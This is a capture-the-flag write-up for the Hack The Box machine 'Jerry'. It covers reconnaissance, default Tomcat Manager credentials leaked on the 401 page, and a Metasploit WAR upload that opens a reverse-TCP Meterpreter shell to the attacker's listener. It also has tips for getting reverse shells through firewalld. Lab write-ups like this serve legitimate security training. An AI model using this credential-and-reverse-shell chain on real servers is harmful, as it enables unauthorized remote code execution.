# HTB Jerry — Writeup
**OS:** Windows Server (Apache Tomcat 7.0.88)
**Difficulty:** Easy
**Attack Vector:** Tomcat Manager default credentials + WAR reverse shell
**System:** Arch Linux

---

## Summary

Jerry is an easy Windows machine running Apache Tomcat 7.0.88 on port 8080. The Tomcat Manager application is accessible with default credentials (`tomcat:s3cret`), which are leaked on the 401 error page. Exploitation is straightforward — upload a malicious WAR file via the Manager to get a Meterpreter shell. Both user and root flags are in a single file on the Administrator desktop.

---

## Reconnaissance

### Port Scan
```bash
nmap -sV -Pn -T4 10.129.136.9
```

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

Only one port open — HTTP on 8080.

### Directory Enumeration
```bash
gobuster dir -u http://10.129.136.9:8080 -w /usr/share/wordlists/dirb/common.txt
```

Key findings:
- `/docs` — Tomcat documentation (confirms version 7.0.88)
- `/examples` — default example servlets
- `/manager` — Tomcat Manager application
- `/host-manager` — Host Manager application

### Version Fingerprint
Landing page confirms **Apache Tomcat/7.0.88**.

---

## Exploitation

### Step 1 — Obtain Manager Credentials

Visited `/manager/html` — prompted for HTTP Basic Auth.

Clicked Cancel to view the 401 error page, which leaks credentials in an example XML snippet:

```xml
<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>
```

Confirmed with curl:
```bash
curl -u tomcat:s3cret http://10.129.136.9:8080/manager/html -o /dev/null -w "%{http_code}"
# 200
```

### Step 2 — WAR Upload via Metasploit

```bash
msfconsole -q
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.129.136.9
set RPORT 8080
set HttpUsername tomcat
set HttpPassword s3cret
set LHOST 10.10.16.67
set LPORT 4444
run
```

```
[*] Started reverse TCP handler on 10.10.16.67:4444
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying...
[*] Executing...
[*] Meterpreter session 1 opened
```

### Step 3 — Flags

```
meterpreter > cd C:\\Users\\Administrator\\Desktop\\flags
meterpreter > cat "2 for the price of 1.txt"
```

Both user and root flags in one file — "2 for the price of 1".

---

## Arch Linux Gotchas & Lessons Learned

| Problem | Fix |
|---|---|
| Reverse shells never connect back on ANY HTB machine | **firewalld** on Arch puts `tun0` in the `public` zone which only allows SSH inbound — all reverse shell callbacks get rejected |
| Fix for tun0 firewall | `sudo firewall-cmd --zone=trusted --add-interface=tun0 --permanent` — adds VPN interface to trusted zone, allowing all inbound connections from HTB |
| `tomcat_mgr_upload` fails with bind payloads | Module doesn't support `java/jsp_shell_bind_tcp` well — use reverse TCP payloads instead |
| Tomcat 401 page leaks creds | Always click Cancel on the auth prompt and read the error page — Tomcat shows example `tomcat-users.xml` with actual working credentials |
| `searchsploit tomcat 7.0.88` shows CVE-2017-12617 | Tomcat 7.0.88 is patched against this (fix was in 7.0.82) — default creds are the real path |

---

## Tools Used

- `nmap` — reconnaissance and service detection
- `gobuster` — directory enumeration
- `curl` — credential testing
- `metasploit` (`exploit/multi/http/tomcat_mgr_upload`) — WAR deployment and shell

---

*Four machines down. The firewall mystery is finally solved.* 🏆
